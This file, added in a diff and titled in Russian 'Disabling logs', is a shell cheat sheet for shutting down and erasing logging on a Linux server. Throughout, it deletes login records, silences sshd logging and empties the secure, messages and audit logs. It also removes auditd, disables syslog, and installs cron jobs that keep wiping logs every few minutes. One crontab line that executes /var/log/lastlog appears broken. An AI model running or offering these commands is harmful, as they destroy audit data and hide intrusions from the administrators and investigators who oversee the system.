@@ -1,0 +1,39 @@
+Отключение логов
+
+    # чтобы не работала команда last
+    # The files wtmp and btmp might not be found. The system only logs information in these files if they are
+    #       present.  This  is  a  local configuration issue. If you want the files to be used, they can be created
+    #       with a simple touch(1) command (for example, touch /var/log/wtmp).
+
+    rm -rf /var/log/wtmp /var/log/btmp
+
+    # vim /etc/ssh/sshd_config
+    LogLevel QUIET
+	# (vim: режим редактирования "i", сохранить и выход ":wq" http://www.instanceof.ru/linux/vim/step-by-step)
+
+
+    /etc/init.d/sshd restart
+
+
+    #
+    rm -rf /var/log/*.?  audit/audit.log.?
+    cd /var/log ; echo > secure ; echo > messages  ; echo > audit/audit.log
+
+    # vim /etc/crontab
+    */15 * * * * root /var/log/lastlog
+
+    # removing auditd
+    /etc/rc.d/init.d/auditd stop
+    yum remove audit-1.7.13
+    rm -rf /var/log/audit
+
+    cat > /etc/cron.d/no_log
+    */5 * * * * root rm -f /var/log/lastlog > /dev/null 2>&1
+    */5 * * * * root dmesg -c > /dev/null 2>&1
+    */5 * * * * root echo > /var/log/messages
+
+    /etc/init.d/syslog stop
+    chkconfig --del syslog
+
+
+
